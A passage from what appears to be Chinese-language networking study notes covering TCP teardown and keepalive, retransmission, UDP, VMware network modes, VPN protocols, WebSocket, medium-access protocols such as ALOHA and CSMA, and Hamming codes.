<li>理论上讲，第二次挥手和第四次挥手是不需要我们关心的，TCP程序自己去做的。而第一次挥手和第三次挥手是我们在上层调用方法才去执行的。不过在实际的应用中，TCP有一个“延时确认”的特性，在收到包的时候不用立刻去发ACK，完全可以等到自己有数据了再一起发过去进行捎带确认。所以第二次挥手和第三次挥手可能会合二为一，我在wireshark上抓包就发现了这一现象。也可以参考<a href="https://jishuin.proginn.com/p/763bfbd6445a">这篇文章</a>。</li>
<li>如果客户端意外死亡，没有发FIN，难道这个连接就持续到服务器重启？下面的Keepalive机制会介绍这种情况的应对方式。</li>
</ol>
<h3 id="keepalive"><a class="header" href="#keepalive">Keepalive</a></h3>
<p>当客户端意外断开，也就是说没有发FIN包就意外去世了，会发生什么呢？</p>
<p>这关系到TCP的<strong>Keepalive机制</strong>。<strong>定义一个时间段</strong>，如果在这个时间段内没有任何和连接相关的活动（数据包的交互），TCP的Keepalive机制开始，<strong>每隔一个时间段</strong>，发送一个探测报文，如果<strong>连续的若干个</strong>探测报文没有得到响应，认为当前的TCP连接已经死亡。</p>
<p>更详细的介绍，可以参考<a href="Basic/Networking/Websocket.html">Websocket</a></p>
<h2 id="retransmission"><a class="header" href="#retransmission">Retransmission</a></h2>
<p>TCP是依赖于不可靠的IP实现的可靠协议。Sender发送的Packet可能丢失、也可能是Receiver的Ack丢失，或者是延迟太大让我们以为丢失了。无论如何，我们都要重新发送Packet。那么我们应该在什么情况下重新发送呢？或者说，我们应该如何确定一个时间参数，在这个时间内如果没有接收到Ack包我们就重新发送呢？以及，应该发送认为丢失的Packet还是之后的所有Packet呢？</p>
<ol>
<li>
<p>超时。TCP每发送一个报文段，就会为报文段设置一个计时器。如果计时器设置的重传时间到期但还没有收到确认，就要重传这一报文段。</p>
<p>那么这个时间设置成多少合适呢？TCP采用一种自适应算法，他记录一个报文的发出时间和相应收到确认的时间。这两个时间之差被称为报文段的RTT(Round-Trip Time，往返时间)。TCP保留了RTT的一个<strong>加权平均RTT</strong>，随着每次新测量的RTT变化。我们的超时重传时间略大于RTT。</p>
</li>
<li>
<p>冗余ACK。例如，发送方发送了1，2，3，4，5的报文段，但是接受方只收到了1，3，4，5，那么接收方就发送3个对1号报文的冗余ACK，表示自己希望收到2号报文段。TCP规定当发送方接收到对同一个报文段的3个冗余ACK时，就可以确认丢失。这种技术被称为<strong>快速重传</strong>，还用在<a href="Basic/Networking/./%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%92%8C%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6.html">拥塞控制</a>中。</p>
</li>
</ol>
<p>另外，我们应该重传多少次呢？无限制的话，可能Receiver真的掉线或者网太差了，你怎么重传他都收不到。有限制的话，多少比较合适。RFC并没有规定，在Linux的实现中，最大重传次数由<code>tcp_syn_retries</code>限制。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="udp"><a class="header" href="#udp">UDP</a></h1>
<p>比TCP简单的多。UDP的一些特征：<strong>无连接，不可靠，面向报文</strong>。</p>
<div class="table-wrapper"><table><thead><tr><th>Property</th><th>Behavior</th></tr></thead><tbody>
<tr><td>Connectionless Datagram Service</td><td>NO connection established. Packets may show up in any order</td></tr>
<tr><td>Self contained datagrams</td><td>UDP对应用层的报文，添加首部之后直接交付给IP层。需要应用层决定合适的长度。</td></tr>
<tr><td>Unreliable delivery</td><td>1. No ack<br />2. No mechanism to detect missing or mis-sequenced datagrams<br />3. No flow control</td></tr>
</tbody></table>
</div>
<p>UDP是一个不可靠的协议。所以通常用于并不需要reliable delivery的应用，或者我们可以基于UDP建立一个reliable delivery，比如google的QUIC。</p>
<p>UDP header封装的额外信息非常的少，只有必要的信息。<code>src port|dst port|length|checksum</code>，可以看下面的图。和UDP打交道，就像和IP直接打交道一样。</p>
<p><img src="Basic/Networking/../images/image-20211101155733568.png" alt="image-20211101155733568" /></p>
<ul>
<li>Checksum: 计算有些特殊。**计算伪首部、UDP首部、UDP Data的检验和。**如下图所示。伪首部和填充的0（在UDP的长度不是偶数个字节的时候，我们会填入0）是不传输的，仅仅作为计算checksum使用。</li>
<li>length: UDP header + UDP data 的长度。单位是字节。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="vmware虚拟机网络配置"><a class="header" href="#vmware虚拟机网络配置">VMWare虚拟机网络配置</a></h1>
<p>当我们打开虚拟机进行网络配置的时候<code>VM-&gt;Setting-&gt;Network Adapter</code>，会看见三个选项</p>
<ul>
<li>Bridge: Bridged networking connects a virtual machine to a network using the host computer's Ethernet adapter.</li>
<li>NAT: NAT gives a virtual machine access to network resources using the host computer's IP address.</li>
<li>Host-Only: Host-only networking creates a network that is completely contained within the host computer.</li>
</ul>
<p>我们分别进行介绍。</p>
<h2 id="bridge"><a class="header" href="#bridge">Bridge</a></h2>
<p>官网上提供的资料，网络拓扑是下面这样的。也就是说，<strong>你的虚拟机就跟另一台独立的物理主机一样</strong>。所以我们应该自己动手配置。</p>
<p><img src="Basic/Networking/../images/bridged_1_t.png" alt="Link to bridged_1.png" /></p>
<p>在这个时候，我们应该将我们的虚拟机IP和主机IP配置在同一个网段下，或者采用DHCP动态分配。这个取决于你所在的网络情况，现在我们大都通过WIFI上网，所以一般选择DHCP，但是虚拟机没有虚拟无线网卡，要自己再插一张无线网卡进去才能连WIFI；或者选择“Duplicate physical network state”。</p>
<h2 id="nat"><a class="header" href="#nat">NAT</a></h2>
<p><img src="Basic/Networking/../images/nat_1.png" alt="" /></p>
<p>我们知道，因为IPv4地址不足，我们有NAT协议。NAT主要用于实现私有网络访问公共网络的功能，实现内网IP和外网IP的相互转换。</p>
<p>这个NAT服务器，实际上是把虚拟机的IP和我们主机的IP做了相互的转换。</p>
<h3 id="信息查看"><a class="header" href="#信息查看">信息查看</a></h3>
<p>通过Windows上的<code>ipconfig</code>或者Linux上的<code>ifconfig</code>，我们可以发现主机和虚拟机在这个虚拟的局域网内的IP。这个DHCP分配IP是从128开始分配的，也可以自己进行配置。</p>
<pre><code>Host: 192.168.60.1/24
VM  : 192.168.60.130/24
</code></pre>
<p>然后怎么看这个NAT服务器的IP地址呢？他肯定是我们虚拟机的默认网关。Linux下通过<code>route -n</code>可以查看，<code>route</code>查看路由表，<code>-n</code>是让打印路由表的时候不要用<code>_gateway</code>代替真正的IP地址。或者用<code>tracepath -n 某外网地址</code>，第一个目的地肯定是我们的默认网关。</p>
<pre><code>NAT : 192.168.60.2
</code></pre>
<h2 id="host-only"><a class="header" href="#host-only">Host-Only</a></h2>
<p><img src="Basic/Networking/../images/host-only_1_t.png" alt="Link to host-only_1.png" /></p>
<h3 id="信息查看-1"><a class="header" href="#信息查看-1">信息查看</a></h3>
<p>方法同NAT，观察到</p>
<pre><code>Host: 192.168.182.1/24
VM  : 192.168.182.130/24
</code></pre>
<p>一看默认网关，啊哈，没有的。也就是说，只能在内网工作了（只能Ping主机了）。</p>
<blockquote>
<p>我觉得，其实这个和Bridge的区别就在于，这个用DHCP帮你把IP配置在和主机一样的网段了，而Bridge啥都没给你配。主要是我没有以太网实验。</p>
</blockquote>
<h2 id="总结-3"><a class="header" href="#总结-3">总结</a></h2>
<p>如果你只是想让虚拟机能上网，请用NAT，这个最省事。如果你的电脑用以太网上网，也可以用Bridge。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="vpn"><a class="header" href="#vpn">VPN</a></h1>
<p>VPN(virtual private network)，虚拟专用网络。我们知道私有地址（10.x.x.x，192.168.x.x之类的），采用这样的私有IP地址构成的互联网络就叫做专用网络（或本地网络）。</p>
<p>如果要构建这样的专用网络，如果在距离相近的本地可以使用物理连接的方式，但是如果太远要租用电信公司的线路就代价太高，所以<strong>采用互联网作为专用网之间的通信载体，这样的专用网就被称为VPN</strong>。</p>
<h2 id="实现-ip隧道技术"><a class="header" href="#实现-ip隧道技术">实现-IP隧道技术</a></h2>
<p>假设某个机构在两个较远的地方建立了专用网A和B，其网络地址分别为私有地址<code>10.1.0.0</code>和<code>10.2.0.0</code>。现在我们用互联网构建一个VPN。</p>
<p>显然，每一个场所至少要有一个路由器具有合法的全球 IP 地址，假设边缘路由器RA和RB，他们和互联网连接的接口地址为<code>ipA</code>和<code>ipB</code>。</p>
<p>A中的主机X<code>10.1.0.1</code>像B中的主机Y<code>10.2.0.3</code>发送数据，RA发现<code>10.2.0.3</code>需要通过互联网隧道才能到达，于是将<strong>整个数据报</strong>进行加密，然后添加外部互联网通信的首部。R2收到后进行解密，交付主机Y。</p>
<p><img src="Basic/Networking/../images/image-20211111215204423.png" alt="image-20211111215204423" /></p>
<p>这里介绍的是路由器-路由器的方式。而我们生活中最多用的是PC-路由器的方式。不难看出，PC也可以自己对数据包进行加密封装发送给开启VPN服务的路由器。</p>
<h2 id="加密-1"><a class="header" href="#加密-1">加密</a></h2>
<p>VPN之间的两点通信需要经过互联网，所有经过互联网传送的数据都必须加密（这不是必须的，但是几乎所有的VPN都会去加密通信数据）。</p>
<div class="table-wrapper"><table><thead><tr><th></th><th>OpenVPN</th><th>PPTP</th><th>L2TP/IPsec</th><th>Soft Ether</th><th>Wire Guard</th><th>SSTP</th><th>IKEv2/IPSec</th></tr></thead><tbody>
<tr><td>密钥</td><td>160-bit, 256-bit</td><td>128-bit</td><td>256-bit</td><td>256-bit</td><td>ChaCha20</td><td>256-bit</td><td>256-bit</td></tr>
<tr><td>安全性</td><td>非常高</td><td>弱</td><td>高（可能会被国家安全局削弱）</td><td>高</td><td>高</td><td>高</td><td>高</td></tr>
<tr><td>速度</td><td>快</td><td>较快（低加密）</td><td>中（双重封装）</td><td>非常快</td><td>快</td><td>快</td><td>非常快</td></tr>
<tr><td>稳定性</td><td>非常稳定</td><td>非常稳定</td><td>稳定</td><td>非常稳定</td><td>未知（非主流）</td><td>非常稳定</td><td>非常稳定</td></tr>
<tr><td>兼容性</td><td>强大的桌面支持，但移动设备有待提高。 需要第三方软件。</td><td>强大的Windows桌面支持。</td><td>多设备和多平台支持。</td><td>多桌面和移动操作系统支持。 没有本机操作系统支持。</td><td>Linux，正开发其他操作系统。</td><td>Windows平台，但可在其他Linux发行版上使用。</td><td>Windows和Blackberry以外的有限平台。</td></tr>
<tr><td>总结</td><td>最推荐。 快速安全。</td><td>Windows本机。 安全性弱。对于受地理限制的内容很有用。</td><td>多功能且安全。 替代OpenVPN的一种不错的选择。</td><td>灵活，快速和安全。 替代OpenVPN的绝佳选择。</td><td>承诺将是快速而高效的。 仍在开发中。</td><td>PPTP和L2TP的更快，更安全的替代方法。</td><td>安全，稳定且移动设备友好型。</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="websocket"><a class="header" href="#websocket">WebSocket</a></h1>
<p>在应用层，最为流行的协议应该就是HTTP了，现在大多数Web应用都构建在HTTP协议之上。</p>
<p>然而HTTP通信有一个重要的缺陷（或者说特点），就是他是Request-Response，通信只能由客户端主动发起，无法做到服务器主动向用户端推送信息。为了解决这个问题，我们提出了WebSocket协议。</p>
<h2 id="轮询实现服务器主动推送"><a class="header" href="#轮询实现服务器主动推送">轮询实现服务器主动推送</a></h2>
<p>不过在介绍WebSocket之前，我们首先来看用HTTP可以如何做到服务器向用户推送信息。用的是<strong>轮询方式</strong>。分别有短轮询和长轮询。</p>
<p>短轮询：Client不停的向Server发送Request，这样当Server有想主动推送的消息的时候就可以进行Response，没有想主动推送消息的时候返回一个空结果。这种方式不仅浪费带宽和资源（有很多无用的Request），而且实时性受制于Request的频率（一般不会特别实时）。</p>
<p>长轮询：在长轮询机制中，Client像短轮询一样从Server请求数据。然而，如果Server没有可以立即返回给Client的数据，则不会立刻返回一个空结果，而是保持这个请求等待数据到来（或者恰当的超时），之后将数据作为结果返回给客户端。</p>
<p>可以看到，其实长轮询已经可以不错的做到服务器主动推送的任务了。</p>
<h2 id="长连接和短连接"><a class="header" href="#长连接和短连接">长连接和短连接</a></h2>
<p>介绍两个简单的概念</p>
<ul>
<li>TCP短连接：客户端与服务器建立连接开始通信，一次/指定次数通信结束之后就断开本次TCP连接，当下次再次通信时，再次建立TCP的链接。</li>
<li>TCP长连接：TCP与服务器建立连接之后一直处于连接状态，直到最后不再需要服务的时候才断开连接。</li>
</ul>
<p>想要图简单，不追求高性能，使用短连接合适，这样我们就不需要操心连接状态的管理；想要追求性能，使用长连接，我们就需要担心各种问题：比如 <strong>端对端连接的维护，连接的保活</strong>。</p>
<h2 id="连接保活机制"><a class="header" href="#连接保活机制">连接保活机制</a></h2>
<p>TCP协议本身，其实并没有规定在通信的两端要在长时间没有数据交互时关闭连接。然而在实际的使用中，这确实是有必要的。比如，Client（比如你的电脑）断电了，没有向Server挥手，那么Server如果还一直维护着这个连接的话，就是纯纯的浪费资源了。事实上，各种各样的原因都会导致TCP连接意外断开。</p>
<p>所以，即为了维护可能正常的长久不发送消息的TCP连接，又要断开不正常的“不辞而别”的TCP连接，我们需要有<strong>保活机制</strong>。思路很简单，就是A隔一段时间发个消息，B收到了回复一下，确认连接还正常建立着。TCP有KeepAlive机制，在应用层也会有心跳机制。</p>
<h3 id="keepalive机制"><a class="header" href="#keepalive机制">KeepAlive机制</a></h3>
<p>KeepAlive 并不是 TCP 协议的一部分，但是大多数操作系统都实现了这个机制（所以需要在操作系统层面设置 KeepAlive 的相关参数）。<strong>定义一个时间段</strong>，如果在这个时间段内没有任何和连接相关的活动（数据包的交互），TCP的Keepalive机制开始，<strong>每隔一个时间段</strong>，发送一个探测报文，如果<strong>连续的若干个</strong>探测报文没有得到响应，认为当前的TCP连接已经死亡。</p>
<p>以Linux为例，Linux 操作系统中设置 KeepAlive 相关参数，可以修改 <code>/etc/sysctl.conf</code> 文件：</p>
<pre><code>net.ipv4.tcp_keepalive_time=90
net.ipv4.tcp_keepalive_intvl=15
net.ipv4.tcp_keepalive_probes=2
</code></pre>
<ol>
<li><strong>tcp_keepalive_time</strong>: KeepAlive的空闲时长，或者说每次正常发送心跳的周期，默认值为7200s（2小时）</li>
<li><strong>tcp_keepalive_intvl</strong>: KeepAlive探测包的发送间隔，默认值为75s</li>
<li><strong>tcp_keepalive_probes</strong>: 在tcp_keepalive_time之后，没有接收到对方确认，继续发送保活探测包次数，默认值为9（次）</li>
</ol>
<h3 id="应用层"><a class="header" href="#应用层">应用层</a></h3>
<p>应用层有很多协议，这里以WebSocket的心跳机制为例。</p>
<h2 id="websocket-1"><a class="header" href="#websocket-1">WebSocket</a></h2>
<p>首先介绍一下WebSocket的特点</p>
<ul>
<li>WebSocket同HTTP一样工作在应用层，传输层使用TCP协议。</li>
<li>WebSocket通过HTTP端口80和443进行工作，并支持HTTP代理和中介，从而使其与HTTP协议兼容。</li>
<li>WebSocket提供<strong>全双工通信</strong>并且实现<strong>消息流</strong>（TCP是字节流，也就会出现所谓的“粘包问题”）。</li>
<li>WebSocket现在被所有主流的浏览器支持。</li>
</ul>
<p>正是因为这些特点，让WebSocket在<strong>实时通信RTC</strong>这个领域应用广泛。</p>
<p>我们已经了解TCP协议的实现和特点，那么要在TCP协议之上构建具有上面特点的协议，我们可以想想，应该要做什么呢？下面是我能想到的</p>
<ul>
<li>通过HTTP消息实现WebSocket的<strong>握手</strong></li>
<li>消息头至少要包含包的<strong>长度信息</strong>（或者其他方式来界定消息的边界），<strong>是否断开连接</strong>的信息。</li>
<li>需要自动的保持<strong>心跳</strong>，防止双方太久没有消息TCP自动断开。</li>
</ul>
<p>WebSocket应用于</p>
<ul>
<li>即时聊天通信：微信</li>
<li>实时地图：高德地图</li>
<li>在线协同编辑：金山文档</li>
<li>多玩家游戏：吃鸡</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="medium-access-sublayer"><a class="header" href="#medium-access-sublayer">Medium Access Sublayer</a></h1>
<!-- toc -->
<p><strong>介质访问控制所要完成的主要任务是，为使用介质的每个结点隔离来自同一信道上的其他结点所传送的信号，以协调活动结点的传输。用来决定广播信道中信道分配的协议属于数据链路层的一个子层，称为介质访问控制子层。</strong></p>
<p><img src="Basic/Networking/../images/image-20211025191650499.png" alt="image-20211025191650499" /></p>
<p>首先，什么是复用：</p>
<p><img src="Basic/Networking/../images/image-20211025192347195.png" alt="image-20211025192347195" /></p>
<p>复用再怎么分配，有单独信道好吗。所以使用交换机的以太网就不需要这么花里胡哨的东西了。但是无线网络就必须要共享信道，这时没办法的。</p>
<h2 id="静态划分信道"><a class="header" href="#静态划分信道">静态划分信道</a></h2>
<h3 id="frequency-division-multiplexing"><a class="header" href="#frequency-division-multiplexing">Frequency Division Multiplexing</a></h3>
<p>用户在分配到一定的频带之后，在通信过程中自始至终都占用这个频带。频分复用的所有用户在同样的时间占用不同的带宽资源（这里的“带宽”指的是频率带宽而不是数据的发送速率）。</p>
<p><img src="Basic/Networking/../images/image-20211025192716676.png" alt="image-20211025192716676" /></p>
<p>另外，为了避免频带间的干扰，中间会空出 guard bands。在OFDM中，频谱被更有效率的划分成没有保护带。</p>
<h3 id="time-division-multiplexing"><a class="header" href="#time-division-multiplexing">Time Division Multiplexing</a></h3>
<p>将时间划分成一段段等长的时分复用帧。每一个时分复用的用户在每一个TDM帧中占用固定序号的时隙。</p>
<p><img src="Basic/Networking/../images/image-20211025192731167.png" alt="image-20211025192731167" /></p>
<p>改进的时分复用-<strong>统计时分复用 STDM</strong>。STDM帧不是固定分配时隙，而是按需分配时隙。</p>
<h3 id="wave-division-multiplexing"><a class="header" href="#wave-division-multiplexing">Wave Division Multiplexing</a></h3>
<p>波分多路复用就是光的频分多路复用。</p>
<h3 id="code-division-multiplexing"><a class="header" href="#code-division-multiplexing">Code Division Multiplexing</a></h3>
<p>码分多路复用是采用不同的编码来区分各路原始信号的一种复用方式。和FDM和TDM不同，他即共享信道的频率，又共享时间。</p>
<p>码分多址CDMA是码分复用的一种方式：</p>
<ol>
<li>每个站点会分配到一个<strong>码片序列</strong>，就是一个$m$位的向量。比如$(-1,-1,1,1)$。</li>
<li>如果站点想要发送1，就发送向量，想发送0，就发送负向量。在上面的例子中就是$(-1,-1,1,1)$和$(1,1,-1,-1)$。如果什么都不发送，就相当于发送$(0,0,0,0)$。</li>
<li>每两个站点的码片序列是<strong>正交</strong>的，也就是说他们向量的内积是0。</li>
</ol>
<p>通过上面的三个要求，接受者只需要将收到的向量和X站点的码片序列进行内积就知道X站点发送的信号了。假设有3个站点$A = (-1,-1,1,1) ,B = (1,-1,1,-1), C = (1,-1,-1,1)$。A发送a，B发送b，C发送c。S就是信道上的信号，通过最后一条的计算就可以知道A发送的信号a。
$$
S = aA+bB+cC \
S \cdot A = (aA+bB+cC) \cdot A = a|A|^2 = ma \
\frac{1}{m}S\cdot A = a
$$</p>
<h2 id="动态分配信道"><a class="header" href="#动态分配信道">动态分配信道</a></h2>
<p>在随机访问协议中，不采用集中控制的方式解决发送信息的次序问题。<strong>所有用户能根据自己的意愿随机的发送信息，占用信道的全部速率。<strong>在总线型网络中，当有两个及以上的用户同时发送信息，就会产生</strong>冲突</strong>，导致全部都发送失败（信号叠加成无用信号）。为了解决这个问题，我们也不能真的就随便发送，我们至少需要在发生冲突的时候重传，可能还需要检测冲突，和其他站点协商等。</p>
<h3 id="pure-aloha"><a class="header" href="#pure-aloha">Pure ALOHA</a></h3>
<p>想发就发（不监听信道，不按时间槽发送，随机重发）。如果发生了冲突，随机等待一段时间然后重发。适合通信量小的情况，通信负载一旦很大，就会造成性能的下滑，因为很多包发送失败需要重发，导致恶性循环。</p>
<p><img src="Basic/Networking/../images/image-20211025221728333.png" alt="image-20211025221728333" /></p>
<p>冲突如何检测：如果发生冲突，接收方就会检查出差错，然后不ACK，发送方在一定时间内收不到ACK就判断发生冲突。</p>
<p>冲突如何解决：超时后<strong>随机等待</strong>一段时间再重传。这个涉及重发概率P。</p>
<h3 id="slotted-aloha"><a class="header" href="#slotted-aloha">Slotted ALOHA</a></h3>
<p>需要时钟同步，只有在时间片的开始才能发送数据。比Pure ALOHA的信道利用率高。</p>
<h3 id="csma-carrier-sense-multiple-access"><a class="header" href="#csma-carrier-sense-multiple-access">CSMA (Carrier Sense Multiple Access)</a></h3>
<p>载波侦听(Carrier Sense)指任何连接到介质的设备在欲发送帧前，必须对介质进行侦听，当确认其空闲时，才可以发送。多路访问(Multiple Access)指多个设备可以同时访问介质，一个设备发送的帧也可以被多个设备接收。</p>
<p>当CS发现信道空闲，就可以进行传输；如果发现信道忙，这时候就有三种策略：</p>
<ol>
<li>1-persistent CSMA: 信道忙则一直监听，直到空闲马上传输。如果传输之后发现冲突，隔一个随机时间之后继续开始监听信道。</li>
<li>non-persistent CSMA: 信道忙则等待一个随机时间之后再继续监听信道，如果空闲则马上传输。这样可以减少冲突发生的概率，有更好的信道利用率，但是比1-persistennt CSMA的延迟更高。</li>
<li>p-persistent CSMA: 这个和之前两个不同。<strong>如果发现信道忙就持续侦听直到空闲。如果发现信道空闲，以p概论直接传输；以1-p的概率将此次发送推迟到下一个时间槽。如果下一个时间槽信道也是空闲的，则它还是以概率p发送数据，或者以概率1-p再次推迟发送，这个过程一直持续到成功发送或检测到信道忙为止</strong>。</li>
</ol>
<p>但是这几种方法发生冲突之后还是坚持把数据发送完，因为需要<strong>根据发送完之后的确认帧知道是否冲突</strong>。所以我们有了CSMA/CD。</p>
<h3 id="csmacd-collision-detection"><a class="header" href="#csmacd-collision-detection">CSMA/CD (Collision Detection)</a></h3>
<p>碰撞检测(Collision Detection)是<strong>边发送边监听</strong>，判断自己发送数据时其他站是否也在发送数据（检测电压幅值）。这意味着是CSMA/CD应用于半双工网络。</p>
<p>我们已经有CS了，还需要CD，因为信号在信道传输时需要时间的。对于传播时延很大的信道，我们等待确认帧来确定是否发生碰撞的效率太低，这时CD就非常有意义。</p>
<p>如果在发送的过程中检测到冲突，需要隔一个随机时期再次发送。具体是怎么做呢？用了<strong>截断二进制指数规避算法Truncated Binary Exponential Backoff</strong>。</p>
<ol>
<li>确定基本退避时间为<strong>争用期</strong>$2t$ (t是两点之间的<strong>传输延迟</strong>)</li>
<li>定义重传参数k，$k=min(重传次数,10)$。</li>
<li>从离散的集合${0,1,...,2^k-1}$中取出一个随机数r。重传需要的退避时间为$2rt$。</li>
<li>如果重传次数达到16次而仍不能成功，说明网络太拥挤，认为此帧永远无法正确发出，抛弃此帧并向高层报告出错。</li>
</ol>
<p>由此我们也可以知道，$最小帧长 = 2t*数据传输速率$。<strong>这样可以保证发出的帧如果在发送的过程中没有检测到冲突，就一定没有发生冲突。</strong></p>
<blockquote>
<p>我们知道经典以太网使用CSMA/CD，最小帧长是64B(512bit)。所以可以根据这个计算一些东西。</p>
</blockquote>
<h3 id="csmaca-collision-avoidance"><a class="header" href="#csmaca-collision-avoidance">CSMA/CA (Collision Avoidance)</a></h3>
<p>碰撞避免(Collision Avoidance)用于无线局域网。因为无线局域网难以检测碰撞，具体可以参考下面的说明。CSMA/CD用于总线局域网。CA并不是可以完全避免碰撞，而是降低发生碰撞的概率。</p>
<blockquote>
<p>The basic idea behind CSMA/CA is that the station should be able to receive while transmitting to detect a collision from different stations. In wired networks, if a collision has occurred then the energy of received signal almost doubles and the station can sense the possibility of collision. In case of wireless networks, most of the energy is used for transmission and the energy of received signal increases by only 5-10% if a collision occurs. It can’t be used by the station to sense collision. Therefore <strong>CSMA/CA has been specially designed for wireless networks</strong>. </p>
</blockquote>
<p>我们的无线局域网还引入了更强的Collision Avoidence方法，<strong>RTS/CTS handshaking</strong> 。这个方法是CSMA/CA的补充，是可选的。先看下面的图，AC互相无法通信，所以同时给B发送消息导致碰撞。</p>
<p><img src="Basic/Networking/../images/HiddenNode.jpg" alt="img" /></p>
<p>我们来看这个问题怎么解决。现在A想向B发送数据：</p>
<ol>
<li>A先给B发送一个RTS(Request To Send,携带着src,dst,data length等信息)
<ul>
<li>其他收到RTS的站点，沉默一会儿等A能收到CTS，之后就可以发送数据了。因为碰撞干扰是对于接受者来说的。</li>
</ul>
</li>
<li>B收到RTS之后，发送一个CTS(Clear To Send,携带者src, dst等信息)。对于A来说，这代表允许发送；而对于其他站点如C来说，这是让自己不要发送。</li>
<li>A收到CTS之后，就可以开始发送数据了。</li>
<li>等到B返回ACK，其他站点就知道，这个传输完成。自己也可以发送RTS了。A也知道，发送成功了。</li>
</ol>
<p>这个协议感觉挺脆弱的，如果有一个恶意站点不停的广播CTS或者RTS都可以让其他站点闭嘴。</p>
<h3 id="token-ring"><a class="header" href="#token-ring">Token Ring</a></h3>
<p>Token Ring, Bit-Map Protocol, Binary Countdown都是无冲突协议。</p>
<p>令牌代表了发送权限，以预定义的顺序从一个站传到下一个站。如果站有个等待传输的帧队列，当它接收到令牌才可以发送帧，然后再把令牌传递到下一站。如果它没有排队的帧要传，则它只是简单地把令牌传递下去。也可以看出，令牌环应用的局域网，<strong>逻辑拓扑是环形</strong>。他适合负载很高的信道。</p>
<p><img src="Basic/Networking/../images/image-20211026100714533.png" alt="image-20211026100714533" /></p>
<h3 id="bit-map-protocol"><a class="header" href="#bit-map-protocol">Bit-Map Protocol</a></h3>
<p>需要同步的时钟和站点的总数。分成竞争期和传输期。</p>
<p>竞争期：每个竞争期正好包含N个槽。如果k号站有一帧数据要发送，则它在第k个槽中传送第k位。在这个槽中，不允许其他站发送。当所有N个槽都经过后，每个站都知道了哪些站希望传送数据。这时候，它们便按照数字顺序开始传送数据了。</p>
<p><img src="Basic/Networking/../images/image-20211026101714078.png" alt="image-20211026101714078" /></p>
<h3 id="binary-countdown"><a class="header" href="#binary-countdown">Binary Countdown</a></h3>
<p>基本位图协议存在一个问题。每个站的开销是1位，所以该协议不可能很好地扩展到含有上千个站的网络中，扩展后的令牌传递也有同样的问题。通过使用二进制的站地址，我们可以做得更好。如果一个站想要使用信道，它就以二进制位串的形式广播自己的地址，从高序的位开始。假定所有地址都有同样的长度。不同站地址中相同位在同时发送时被信道OR在一起。</p>
<p>一个站只要看到自己的地址位中的0值位置被改写成了1，则它必须放弃竞争。来看一个例子</p>
<p><img src="Basic/Networking/../images/image-20220106104715036.png" alt="image-20220106104715036" /></p>
<p>所以，该协议具有这样一种特性，高序站的优先级比低序站的优先级高（地址大的优先级高）。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="可靠传输-1"><a class="header" href="#可靠传输-1">可靠传输</a></h1>
<blockquote>
<p>可靠：</p>
<ol>
<li>传输数据不会收到损坏(比特差错)或丢失。</li>
<li>所有的数据按照发送顺序进行交付。</li>
</ol>
</blockquote>
<p>可靠传输的下层协议可能是不可靠的，但是我们仍然可以在不可信的下层协议上构建可靠的传输信道。比如TCP协议。TCP 实现可靠传输的四种实现方法：<strong>校验，序号，确认，重传</strong>。</p>
<p>可靠传输机制及其用途的总结：</p>
<ul>
<li>关于Checksum，可以查看<a href="Basic/Networking/./%E5%B7%AE%E9%94%99%E6%8E%A7%E5%88%B6.html">差错控制</a>。</li>
<li>关于Seq, Ack, Window, Timer可以查看<a href="Basic/Networking/./%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%92%8C%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6.html">拥塞控制和流量控制</a>。</li>
</ul>
<p><img src="Basic/Networking/../images/image-20211101104331425.png" alt="image-20211101104331425" /></p>
<p>值得注意的是，可靠传输并不意味着一定能将消息送达，而是在消息无法送达的时候发送者也可以有感知。</p>
<ul>
<li>原因是显然的，比如AB建立了TCP连接，我反手把A的网线拔了，消息如何送达？</li>
<li>但是消息无法送达一定是有所感知的。比如在A网线被拔的情况，B通过TCP发送消息给A，那么在一段时间后得不到A的确认消息，判定超时，B就可以感知到。</li>
<li>所以，应用层可以做进一步处理。比如B给A发消息超时未收到确认的情况，可能是因为A的网太差了他其实收到了，也可能是因为A真的没收到，也可能是A掉线了还没和你挥手，也可能是我的网太差了没收到确认，等等。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="差错控制"><a class="header" href="#差错控制">差错控制</a></h1>
<!-- toc -->
<p>网络设计者针对错误处理已经研究出两种基本策略。这两种策略都在发送的数据中加入<strong>冗余信息</strong>。一种策略是在每一个被发送的数据块中包含足够多的冗余信息，以便接收方能据此推断出被发送的数据是什么。另一种策略也是包含一些冗余信息，但这些信息只能让接收方推断出是否发生了错误（而推断不出哪个发生了错误〉，然后接收方可以请求发送方重传。</p>
<p>前一种策略使用了<strong>纠错</strong>码（ error-correcting code ），后一种策略使用了<strong>检错</strong>码( error-detecting code ）。使用纠错码的技术通常也称为前向纠错（ FEC , Forward Error Correction ）。一般来说，对于高度可信的信道（比如光纤）我们可以采用检错；而对于经常发生错误的信道（比如无线信道）我们采用纠错。</p>
<p>假设一帧由m个数据位（即信息）和r个冗余位（即校验）组成。m+r=n</p>
<h2 id="海明码纠错star"><a class="header" href="#海明码纠错star">海明码（纠错）:star:</a></h2>
<p>两个码字中不相同的位的个数称为<strong>海明距离（Hamming distance)</strong> 。如果两个码字的海明距离为d ，则需要d个1位错误才能将一个码字转成另一个码字。为了可靠地<strong>检测</strong>d个错误，需要一个距离为 d+1 的编码方案；为了可靠的<strong>纠正</strong>d个错误，需要一个距离为2d+1的编码方案。</p>
<blockquote>
<p>设想我们要设计一种编码方案，每个码字有m个消息位和r个校验位，并且能够<strong>纠正所有的单个错误</strong>。对于$2^m$个合法消息，任何消息都对应有$n$个非法的码字，他们与该消息的距离为$1$。这些非法的码字可以这样构成：将该消息对应的合法码字的$n$位，逐个取反，可以得到$n$个距离为$1$的非法码字。因此，每个$2^m$中的合法消息需要有$n+1$个位模式来标识它们。由于总共有$2^n$个位模式，所以我们必须有$(n+1)2^m \leq 2^n$。由于$n=m+r$，这个要求就变成了$m+r+1 \leq 2^r$</p>
</blockquote>
<p>现在，我们尝试用海明码传输标准ASCII码，7位数据。那么我们至少需要4位冗余位。</p>
